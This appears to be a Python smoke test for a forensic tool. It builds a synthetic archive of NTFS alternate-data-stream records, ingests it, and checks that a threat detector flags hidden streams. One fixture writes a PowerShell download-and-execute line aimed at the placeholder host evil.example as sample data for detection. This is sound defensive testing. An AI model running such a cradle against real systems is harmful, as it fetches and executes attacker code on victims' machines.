# -*- coding: utf-8 -*-
"""Real-ingest smoke test for the collector's ADS output (ads_streams.csv + ads/NNNN.bin).
Builds a synthetic output archive, ingests it under a throwaway case_key, runs the threat
detector, prints what reached the DB and the finding, then deletes every row of that key.
Run inside case-maintainer: python /app/analysis/truth/smoke_ads.py"""
import sys, os, zipfile, shutil
sys.path.insert(0, '/app')
import psycopg2
from core.config import PG_DSN

CK = 'zz_smoke_ads'
DST_DIR = '/data/case_library/%s/uploads/logs' % CK
dst = DST_DIR + '/smoke_output.zip'


def cleanup():
    n = 0
    with psycopg2.connect(PG_DSN) as c:
        c.autocommit = True
        cur = c.cursor()
        cur.execute("""SELECT c.table_name FROM information_schema.columns c JOIN information_schema.tables t
                       ON t.table_name=c.table_name AND t.table_schema=c.table_schema
                       WHERE c.table_schema='public' AND c.column_name='case_key' AND t.table_type='BASE TABLE'""")
        for (t,) in cur.fetchall():
            try:
                cur.execute('DELETE FROM public."%s" WHERE case_key=%%s' % t, (CK,))
                n += max(cur.rowcount, 0)
            except Exception as e:
                print('  del-err', t, str(e)[:80])
    shutil.rmtree('/data/case_library/%s' % CK, ignore_errors=True)
    return n


if '--cleanup-only' in sys.argv:
    print('cleanup rows deleted:', cleanup())
    sys.exit(0)

print('pre-clean rows deleted:', cleanup())
os.makedirs(DST_DIR, exist_ok=True)
csv_text = ('Path,Stream,Size,IsFolder,SHA256,SavedAs,Head\r\n'
            '"C:\\ProgramData\\TEMP","3f9a1c22",64,1,aa,ads\\0001.bin,"hex:00"\r\n'
            '"C:\\Users\\u\\AppData\\Local\\x.dat","cfg.ps1",70,0,bb,ads\\0002.bin,"IEX"\r\n'
            '"C:\\Users\\u\\Desktop\\note.txt","comment",5,0,cc,ads\\0003.bin,"hello"\r\n'
            '"C:\\Users\\u\\Downloads\\a.pdf","Zone.Identifier",26,0,dd,,"[ZoneTransfer]"\r\n')
with zipfile.ZipFile(dst, 'w', zipfile.ZIP_DEFLATED) as out:
    out.writestr('ads_streams.csv', csv_text.encode('utf-8'))
    out.writestr('ads/0001.bin', bytes(range(64)))
    out.writestr('ads/0002.bin', b"IEX (New-Object Net.WebClient).DownloadString('http://evil.example/p')")
    out.writestr('ads/0003.bin', b'hello')
print('archive built:', os.path.getsize(dst), 'bytes')

from parsers.forensic import _ensure_minimal_ingest_from_zip
r = _ensure_minimal_ingest_from_zip(CK)
print('ingest errors:', [e for e in (r or {}).get('errors', []) if 'ads' in str(e).lower()] if isinstance(r, dict) else str(r)[:300])
ok = True
with psycopg2.connect(PG_DSN) as c:
    cur = c.cursor()
    cur.execute("SELECT severity, rule, ioc_value, left(details,90) FROM tool_alerts_v2 WHERE case_key=%s AND tool='ads' ORDER BY 1,3", (CK,))
    al = cur.fetchall()
    for a in al:
        print('  alert', a)
    ok &= len(al) == 3 and sum(1 for a in al if a[0] == 'high') == 2
    cur.execute("SELECT count(*) FROM raw_fallback_v2 WHERE case_key=%s AND parser_family='ads_streams'", (CK,))
    nraw = cur.fetchone()[0]
    print('  raw rows ads_streams:', nraw)
    cur.execute("SELECT count(*) FROM raw_fallback_v2 WHERE case_key=%s AND source_file ILIKE '%%.bin'", (CK,))
    print('  raw rows from .bin (must be 0):', cur.fetchone()[0])
    from analysis.threat_detect import _detect_threats_raw
    f = _detect_threats_raw(CK, c)
    ads = [x for x in f if 'T1564.004' in str(x)]
    for x in ads:
        print('  FINDING', str(x)[:700])
    ok &= len(ads) == 1 and 'вміст:' in str(ads[0]) and 'evil.example' in str(ads[0])
print('RESULT', 'PASS' if ok else 'FAIL')
print('cleanup rows deleted:', cleanup())
